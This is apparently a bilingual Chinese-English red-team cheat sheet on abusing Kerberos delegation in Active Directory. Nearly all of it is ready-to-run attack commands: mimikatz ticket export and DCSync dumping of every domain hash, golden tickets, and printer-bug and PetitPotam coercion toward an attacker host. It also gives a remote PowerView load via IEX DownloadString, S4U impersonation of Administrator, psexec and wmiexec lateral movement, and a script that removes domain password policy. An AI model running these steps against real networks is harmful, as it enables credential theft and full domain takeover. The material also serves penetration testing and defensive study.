# Delegation

##  Unconstrained

### Environment

机器账户设置委派

```powershell
# 1. 获取要配置的计算机对象
$computer = Get-ADComputer -Identity "Computer Name"

# 2. 设置非约束委派
Set-ADAccountControl -Identity $computer -TrustedForDelegation $true

# 3. 验证设置
Get-ADComputer -Identity "Computer Name" -Properties TrustedForDelegation | Select-Object Name,TrustedForDelegation,msDS-AllowedToDelegateTo
# or
Get-ADComputer -Identity "Computer Name" -Properties TrustedForDelegation, msDS-AllowedToDelegateTo
```

### Enumeration

Impacket, findDelegation.py

```cmd
findDelegation -dc-ip <DC IP> domain.local/USERNAME
```

ADFind

```cmd
# 查询非约束委派普通账户
AdFind.exe -b "DC=domain,DC=local" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn

# 查询非约束委派机器账户
AdFind.exe -b "DC=domain,DC=local" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
```

PowerView

```powershell
# 当前执行策略
Get-ExecutionPolicy
Get-ExecutionPolicy -List
Set-ExecutionPolicy

# 本地加载
powershell.exe -ExecutionPolicy Bypass -Command "Import-Module .\PowerView.ps1; Get-NetComputer -Unconstrained -Domain <Domain Name>"
# 远程加载
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1'); Get-NetComputer -Unconstrained -Domain <Domain Name>"
```

### Abuse

#### 机器中存在域管理员的凭证

```cmd
# 导出票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
# 注入票据
mimikatz.exe "kerberos::ptt <Name>.kirbi" "exit"
# 导出域内所有用户的hash
mimikatz.exe "lsadump::dcsync /domain:<Domain Name> /all /csv" "exit"
# 导出域内指定帐户的hash
mimikatz.exe "lsadump::dcsync /domain:<Domain Name> /user:<User> /csv" "exit"
# 获取密码
mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
# 查看票据
mimikatz.exe "kerberos::list" "exit"
# 删除票据
mimikatz.exe "kerberos::purge" "exit"

# 黄金票据
# https://github.com/gentilkiwi/mimikatz/wiki
mimikatz.exe "kerberos::golden /admin:administrateur /domain:<Domain Name> /sid:<SID> [/krbtgt:<Hash NTLM>] [/aes128:aes128_hmac] [/aes256:aes256_hmac] [/ptt] [/ticket:<Name>.kirbi]" "exit"
```

#### 利用漏洞强制域控连接获取凭证

```powershell
# Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):
Rubeus.exe monitor /interval:5
Rubeus.exe monitor /interval:1 /filteruser:<User> /nowrap /consoleoutfile:C:\FILE.txt
```

SpoolSample

https://github.com/leechristensen/SpoolSample

```powershell
# 需要域账户权限执行
SpoolSample.exe TARGET CAPTURESERVER

# Check if the spooler service is available
# Service Name：Spooler
# PowerShell
Get-Service -Name <Service Name>
Start-Service -Name <Service Name>
Stop-Service -Name <Service Name>
Restart-Service -Name <Service Name>
# WMI
Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name = '<Service Name>'"
# 远程查询服务状态
Get-Service -ComputerName <Remote Name or IP> -Name <Service Name>

# CMD
tasklist /svc | findstr spoolsv
net start spooler

# Impacket rpcdump
# Linux
rpcdump.py $TARGET | grep -A 6 "spoolsv"
# Windows
rpcdump $TARGET | findstr "spoolsv"
```

printerbug

https://github.com/dirkjanm/krbrelayx

```powershell
# 需要域账户权限执行
# Plaintext Password
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'

# Hashes
# Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]

# NTLM hashes, format is LMHASH:NTHASH
# -hashes LMHASH:NTHASH
printerbug.py -hashes :[rc4_hmac] 'DOMAIN'/'USER':['PASSWORD']@'TARGET' 'ATTACKER HOST'
# or
printerbug.py -hashes [aes128_cts_hmac_sha1]:[rc4_hmac] 'DOMAIN'/'USER':['PASSWORD']@'TARGET' 'ATTACKER HOST'

# 导入票据
Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]
```

PetitPotam

https://github.com/topotam/PetitPotam

```powershell
# 需要域账户权限执行
PetitPotam listener target
```

Linux

```powershell
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash or Password' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Check that the record was added successfully (after ~3 minutes)
nslookup attacker.DOMAIN_FQDN DomainController

# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
krbrelayx.py --krbsalt 'DOMAIN Username' --krbpass 'password'
# 4.b. or supply the right Kerberos long-term key directly
krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE

# 5. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'

# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
# There should be a krbtgt ccache file in the current directory. And it can be used by
export KRB5CCNAME=`pwd`/'krbtgt.ccache'
```

Windows

```powershell
# Once the KUD capable host is compromised, Rubeus can be used (on the compromised host) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.
Rubeus.exe monitor /interval:5
Rubeus.exe monitor /interval:1 /filteruser:<User> /nowrap /consoleoutfile:C:\FILE.txt

# Once the monitor is ready, a forced authentication attack (e.g. PrinterBug, PrivExchange) can be operated. Rubeus will then receive an authentication (hence a Service Ticket, containing a TGT). The TGT can be used to request a Service Ticket for another service.
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt

# Alternatively, the TGT can be used with S4U2self abuse in order to gain local admin privileges over the TGT's owner.
# Once the TGT is injected, it can natively be used when accessing a service. For example, with Mimikatz, to extract the krbtgt hash with lsadump::dcsync.
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```

## Constrained

### Environment

[唯一 SPN 的名称格式 - Win32 apps | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/win32/ad/name-formats-for-unique-spns)

```powershell
# 创建用户
New-ADUser -Name "<Username>" -GivenName "<Username>" -SamAccountName "<Username>" -UserPrincipalName "<Username>@<Domain NAme>" -Path "CN=Users,DC=domain,DC=local" -AccountPassword (ConvertTo-SecureString "<Password>" -AsPlainText -Force) -Enabled $true

# 给用户添加 SPN
setspn -S <Service Class>/<Host>:<Port>/<Service Name> Accountname
```

### Enumeration

Powershell

```powershell
# 查找域内所有SPN（包括用户和计算机账户）
Get-ADObject -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | 
    Where-Object { $_.ServicePrincipalName } |
    Select-Object DistinguishedName, ObjectClass, ServicePrincipalName

# 仅查找计算机账户的SPN
Get-ADComputer -Filter * -Properties ServicePrincipalName | 
    Where-Object { $_.ServicePrincipalName } |
    Select-Object Name, ServicePrincipalName
```

setspn

```cmd
# 列出域内所有SPN
setspn -Q */*

# 查找特定服务的SPN（如HTTP）
setspn -Q HTTP/*
```

### Abuse

#### With protocol transition

kekeo

```powershell
# 构造服务账户票据
kekeo.exe "tgt::ask /user:<Username> /domain:<Domian Name> /password:<Password> /ticket:<Name>.kirbi" "exit"

# 利用伪造的票据，向域服务器申请CIFS服务票据
kekeo.exe "Tgs::s4u /tgt:<Name>.kirbi /user:Administrator@<Domian Name> /service:cifs/<Domain Controller>" "exit"

# 使用mimikatz将该票据注入当前的会话中，
mimikatz.exe "kerberos::ptt <Name>.kirbi" "exit"
```

Impacket getST.py

```powershell
# 获取服务票据（TGS）
getST -spn "cifs/target" -impersonate "Administrator" DOMAIN/USER:PASSWORD

# 设置 Kerberos 票据缓存环境变量
# Windows 
set KRB5CCNAME=<ticket>.ccache
# Linux
export KRB5CCNAME=<ticket>.ccache
# mimikatz
mimikatz.exe "kerberos::ptc <Name>.ccache" "exit"

# WMI
wmiexec Administrator@<Domain Controller> -k -no-pass
```

From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to conduct a full S4U2 attack (S4U2self + S4U2proxy).

```powershell
# Rubeus Usages
Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self]

Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac]

Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac]

# Calculate hashes
Rubeus.exe hash /user:<User> /password:<Password> /domain:<Domain>
# s4u
Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"Administrator" /domain:"domain" /user:"user" </rc4:HASH | /aes256:HASH> [/outfile:FILENAME] [/ptt]
# Use [/ptt] to import the ticket or mimikatz
mimikatz.exe "kerberos::ptt <Name>.kirbi" "exit"

# 清除票据
Rubeus.exe purge [/user:<User>]
```

#### Without protocol transition

#### getST

Kerberos Bronze - CVE-2020-17049

```powershell
getST.py -force-forwardable -spn "$Target_SPN" -impersonate "Administrator" -dc-ip "$DC_HOST" -hashes :"$NT_HASH" "$DOMAIN"/"$USER"

getST -spn "cifs/target" -impersonate "Administrator" DOMAIN/USER:PASSWORD -force-forwardable

getST -force-forwardable -spn "$Target_SPN" -impersonate "Administrator" -dc-ip "$DC_HOST" -hashes :"$NT_HASH" "$DOMAIN"/"$USER"
```

####  Full S4U2 (self + proxy)

```powershell
Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" </rc4:HASH | /aes256:HASH>
```

#### Additional S4U2proxy

```powershell
Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /tgs:"base64 | file.kirbi" /domain:"domain" /user:"user" 
```

## Resource-based constrained

msDS-AllowedToActOnBehalfOfOtherIdentity

```powershell
# Windows
addcomputer -method SAMR -dc-ip <DC IP> -computer-name <Name$> -computer-pass p <Password> DOMAIN/USER:PASSWORD

rbcd -dc-ip <DC IP> -action write -delegate-from <ControlledAccount> -delegate-to <Attck Target>$ DOMAIN/USER:PASSWORD

getST -spn "cifs/target" -impersonate "Administrator" DOMAIN/USER:PASSWORD

set KRB5CCNAME=<Name>.ccache

psexec -k -no-pass <Attck Target>
```

### RBCD on SPN-less users

####  Windows Abuse

```powershell
# 前提条件: 域用户委派到域控机器

# 时间同步
w32tm /config /manualpeerlist:<DC IP> /syncfromflags:manual /update
w32tm /resync

# 获取到一个普通域账户（没有设置SPN），计算其密码的 RC4
pypykatz crypto nt <Password>
Rubeus.exe hash /user:<User> /password:<Password> /domain:<Domain>

# 获取委派用户的 TGT
getTGT -hashes :<RC4 Hash> <Domain>/<User>

# 解析 TGT（Ticket Granting Ticket），ST（Service Ticket）
describeTicket <UserWithoutSPN>.ccache

# 修改域账户的hash
changepasswd -newhashes :TGTSessionKey <Domain>/<User>:<Password>

# 设置票据请求域控ST
set KRB5CCNAME=<UserWithoutSPN>.ccache
getSTM -u2u -impersonate "Administrator" -spn <host/target.domain.com> -k -no-pass <Domain>/<UserWithoutSPN> -dc-ip <DC IP>

# 利用
smbexec/psexec/wmiexec -k -no-pass <AD>

# 恢复密码
smbpasswd -hashes :TGTSessionKey -newhashes :OldNTHash <Domain>/<UserWithoutSPN>@<DC>
```

报错

```powershell
[-] Some password update rule has been violated. For example, the password history policy may prohibit the use of recent passwords or the password may not meet length criteria.

# 域密码策略限制
# 需要以域管理员身份运行此脚本

# 导入 Active Directory 模块
Import-Module ActiveDirectory

# 获取当前域默认密码策略
$currentPolicy = Get-ADDefaultDomainPasswordPolicy

# 显示当前策略设置
Write-Host "当前域密码策略:"
$currentPolicy | Format-List *

# 设置新密码策略为"无限制"
Set-ADDefaultDomainPasswordPolicy -Identity $currentPolicy.DistinguishedName `
    -ComplexityEnabled $false `
    -MinPasswordLength 0 `
    -MaxPasswordAge (New-TimeSpan -Days 0) `
    -MinPasswordAge (New-TimeSpan -Days 0) `
    -LockoutThreshold 0 `
    -LockoutObservationWindow (New-TimeSpan -Minutes 0) `
    -LockoutDuration (New-TimeSpan -Minutes 0) `
    -PasswordHistoryCount 0 `
    -ReversibleEncryptionEnabled $true `
    -Confirm:$false

# 验证修改后的策略
$newPolicy = Get-ADDefaultDomainPasswordPolicy
Write-Host "修改后的域密码策略:"
$newPolicy | Format-List *

Write-Host "域密码策略已修改为无限制设置。" -ForegroundColor Green
```

#### Linux Abuse

```bash
# Obtain a TGT through overpass-the-hash to use RC4
getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'

# Obtain the TGT session key
describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'

# Change the controlledaccountwithoutSPN's NT hash with the TGT session key
changepasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'

# Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN' -dc-ip 'DC IP'

# The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
```

## S4U2self Abuse

```powershell
# 前提条件
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Windows
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket" 

# Linux 
getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"
export KRB5CCNAME="/path/to/ticket.ccache"
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
```

## S4U2self Abuse

```powershell
# Windows
# Machine account's TGT
Rubeus.exe tgtdeleg /nowrap /target:<SPN>
Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"

# Obtain a Service Ticket
Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"

# Linux
# Machine account's TGT
getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"

# Obtain a Service Ticket
export KRB5CCNAME="/path/to/ticket.ccache"
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
```

## Empowering Active Directory Objects and Reflective Resource-Based Constrained Delegation

如果拥有计算机账户的凭据，甚至只是一个TGT，就可以从该账户配置基于资源的受限委派（反射RBCD），然后使用S4U2Self和S4U2Proxy为任意用户获取其TGS

```powershell
Rubeus.exe asktgt /nowrap /domain:<Domain> /user:<Machine Account$> [/rc4:<NTHash> | /aes256:<NTHash>] [/ptt]
Rubeus.exe ptt /ticket:<Base64 Ticket>

Import-Module .\Microsoft.ActiveDirectory.Management.dll
Set-ADComputer <Machine Account> -PrincipalsAllowedToDelegateToAccount <Machine Account$>
Get-ADComputer <Machine Account> -Properties PrincipalsAllowedToDelegateToAccount

Rubeus.exe s4u /nowrap /domain:<Domain> /user:<Machine Account$> [/rc4:<NTHash> | /aes256:<NTHash>] /msdsspn:cifs/<Machine Account SPN> /impersonateuser:Administrator [/ptt] [/outfile:<name>.kirbi]

smbexec -k -no-pass <Machine Account>
```

## 附录

检查域控制器的KDC服务

```powershell
Get-Service -Name "Kdc"
Start-Service -Name "Kdc"
Set-Service -Name "Kdc" -StartupType Automatic
```

检查网络与防火墙

```powershell
Test-NetConnection <DC IP> -Port 88
```

同步时间

```powershell
# 检查时间差 
# 攻击机器与域控制器的时间差必须≤5分钟
# 查看攻击机器时间
w32tm /query /status

# 强制同步时间
w32tm /config /manualpeerlist:<DC IP> /syncfromflags:manual /update
w32tm /resync
```

启用 net view /domain

```powershell
# 服务名称：Browser
# 显示名称：Computer Browser
# 对应命令：net view
Start-Service -Name "Browser"
```

允许用户使用winrs

```powershell
net group "Remote Management Use" <User> /add
```

